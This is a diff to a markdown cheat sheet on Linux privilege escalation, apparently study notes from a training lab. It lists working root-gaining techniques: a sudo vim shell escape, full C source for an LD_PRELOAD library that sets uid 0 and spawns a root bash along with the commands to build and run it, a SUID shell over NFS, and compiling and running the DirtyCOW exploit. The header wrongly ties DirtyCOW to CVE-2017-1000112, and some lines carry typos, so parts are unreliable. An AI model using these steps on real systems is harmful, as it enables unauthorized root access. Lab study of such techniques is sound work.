@@ -277,18 +277,32 @@ VIM
 sudo vim -c ':!/bin/sh'
 ```
 ```
-SUID/SUDO
---binary
-----shell escape (GTO/Linpeas)
-----read/write feature (GTP/linpeas)
-----exploit 
+SUID/SUDO binaries - privilege escalation possibilities 
+--SUDO/SUID binaries
+----shell escape on binaries
+----write access on binaries 
+----exploit binaries 
 ```
 
 ## CATEGORY "SUDO" - ENVIRONMENT VARIABLES
 ```
 sudo -l
+cat /home/user/tools/sudo/preload.c
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+        unsetenv("LD_PRELOAD");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+
 gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
 sudo LD_PRELOAD=/tmp/preload.so program-name-her
+sudo LD_PRELOAD=/tmp/preload.so /usr/bin/find
+#
 ```
 
 ## CATEGORY "CRON JOBS" - FILE PERMESSIONS 
@@ -437,8 +451,9 @@ chmod +xs /tmp/nfs/shell.elf
 /tmp/shell.elf
 ```
 
-## CATEGORY "PASSWORDS & KEYS" - KERNEL VULNERABILITIES (CVE-2017-1000112 DIRTYCOW)
+## CATEGORY "KERNEL VULNERABILITIES"   
 ```
+CVE-2017-1000112 DIRTYCOW
 perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
 gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
 ./c0w
